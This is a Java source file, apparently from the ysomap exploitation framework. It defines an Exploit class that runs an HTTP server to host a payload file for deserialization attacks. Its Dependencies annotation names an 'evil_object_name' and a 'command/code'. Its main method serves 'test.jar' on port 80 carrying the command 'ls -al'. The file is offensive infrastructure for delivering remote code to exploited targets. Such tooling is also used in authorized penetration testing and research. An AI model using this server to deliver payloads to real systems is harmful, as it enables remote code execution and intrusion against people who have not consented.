package ysomap.exploit.http;

import com.sun.net.httpserver.HttpHandler;
import ysomap.annotation.Authors;
import ysomap.annotation.Dependencies;
import ysomap.exploit.Exploit;
import ysomap.util.HTTPHelper;


/**
 * @author wh1t3P1g
 * @since 2020/2/18
 */
@Authors({Authors.WH1T3P1G})
@Dependencies({"--args port --args evil_object_name --args command/code"})
public class SimpleHTTPServer extends Exploit {

    private String port;
    private String filename;
    private String body;

    public SimpleHTTPServer() {
    }

    @Override
    public void run() throws Exception {
        int p = Integer.parseInt(port);
        HttpHandler handler = HTTPHelper.makeHTTPHandler(filename, body);

        HTTPHelper.makeSimpleHTTPServer(p,"/"+filename, handler);
    }

    public static void main(String[] args) throws Exception {
        new SimpleHTTPServer()
                .set("port","80")
                .set("filename","test.jar")
                .set("body","ls -al")
                .run();
    }
}
